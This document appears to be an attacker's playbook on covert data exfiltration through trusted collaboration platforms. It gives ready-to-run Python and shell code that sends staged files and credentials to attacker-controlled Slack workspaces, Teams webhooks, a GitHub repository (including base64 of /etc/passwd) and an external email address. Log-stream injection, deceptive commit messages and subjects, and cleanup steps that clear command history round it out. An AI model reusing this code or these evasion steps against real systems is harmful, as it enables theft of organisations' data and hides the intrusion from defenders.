# Covert channels for exfiltration

Using platforms designed for communication and collaboration as data
exfiltration channels. These platforms are trusted, whitelisted, and
commonly in use; traffic to and from them is rarely inspected for content.

## Slack

Slack supports file uploads and incoming webhooks. An attacker who can
create a Slack app or obtain a bot token in an attacker-controlled workspace
can receive data via Slack's HTTPS API.

```python
import requests, os

# Slack: upload a file to attacker-controlled workspace via bot token
def exfil_to_slack(filepath, token, channel_id):
    with open(filepath, 'rb') as f:
        r = requests.post(
            'https://slack.com/api/files.upload',
            headers={'Authorization': f'Bearer {token}'},
            data={'channels': channel_id,
                  'filename': os.path.basename(filepath),
                  'initial_comment': 'system telemetry'},
            files={'file': f})
    return r.json().get('ok')

exfil_to_slack('/tmp/staged.zip', 'xoxb-ATTACKER-BOT-TOKEN', 'CHANNEL_ID')
```

For smaller chunks of data (credentials, tokens), use the chat.postMessage API:

```python
def exfil_text(data, token, channel_id):
    r = requests.post(
        'https://slack.com/api/chat.postMessage',
        headers={'Authorization': f'Bearer {token}',
                 'Content-Type': 'application/json'},
        json={'channel': channel_id,
              'text': f'```{data}```',
              'mrkdwn': False})
    return r.json()
```

## Microsoft Teams

Teams supports incoming webhooks and file uploads via SharePoint. An
attacker-controlled Teams tenant can receive data via the Graph API or
webhook.

```python
import requests, json

# Teams: send via incoming webhook (no authentication required after setup)
webhook_url = 'https://TENANT.webhook.office.com/webhookb2/...'

def exfil_to_teams_webhook(data):
    r = requests.post(webhook_url,
        headers={'Content-Type': 'application/json'},
        json={'text': data[:4000]})  # Teams webhook max ~4KB per message
    return r.status_code

# for larger payloads, split and send multiple messages
import base64
with open('/tmp/staged.zip', 'rb') as f:
    encoded = base64.b64encode(f.read()).decode()
chunk_size = 3000
for i, chunk in enumerate([encoded[j:j+chunk_size]
                            for j in range(0, len(encoded), chunk_size)]):
    exfil_to_teams_webhook(f'part_{i}: {chunk}')
```

## Git repositories

Data committed to a repository is transmitted to the remote via HTTPS.
The content is opaque unless the remote is inspected.

```bash
# initialise a staging repo
cd /tmp/staging
git init
git remote add origin https://ATTACKER_TOKEN@github.com/attacker/exfil-repo.git

# add staged data as a commit
cp /tmp/staged.zip ./data.zip
git add data.zip
git commit -m "Update system configuration cache"  # plausible commit message
git push origin main --quiet

# for ongoing exfiltration: append data to a file and push each time
echo "$(date): $(cat /etc/passwd | base64)" >> ./telemetry.log
git add telemetry.log
git commit -m "Telemetry update $(date +%Y%m%d)"
git push origin main --quiet
```

## Application logs and telemetry streams

If the target application ships logs to an external monitoring service,
injecting data into the log stream sends it to that service:

```python
import logging, requests

# if the application uses a cloud logging service (Datadog, Splunk HEC, etc.):
# add log lines containing Base64-encoded data
# the log shipper sends them to the external service on schedule

# example: inject into a Python application's logger
import base64

def log_exfil(data, chunk_size=500):
    encoded = base64.b64encode(data).decode()
    for i in range(0, len(encoded), chunk_size):
        logging.info(f'cache_sync_event id={i} data={encoded[i:i+chunk_size]}')
```

## Email

Large attachments to external addresses blend into normal business email in
the absence of DLP. Use the target organisation's own SMTP relay if accessible:

```bash
# using the organisation's mail relay (if unauthenticated relay is permitted internally)
python3 -c "
import smtplib, base64
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders

msg = MIMEMultipart()
msg['From'] = 'svc-monitor@target.local'
msg['To'] = 'attacker@example.com'
msg['Subject'] = 'Monthly system report'

with open('/tmp/staged.zip', 'rb') as f:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(f.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', 'attachment', filename='report.zip')
msg.attach(part)

with smtplib.SMTP('mail.target.local', 25) as s:
    s.sendmail(msg['From'], msg['To'], msg.as_string())
"
```

## Clean up

After any covert channel exfiltration:
- Remove any bot tokens or webhook URLs from the target
- Clear command history on Linux or PowerShell
- Delete staged files from the target
- Remove any git repositories or partial checkouts used for staging
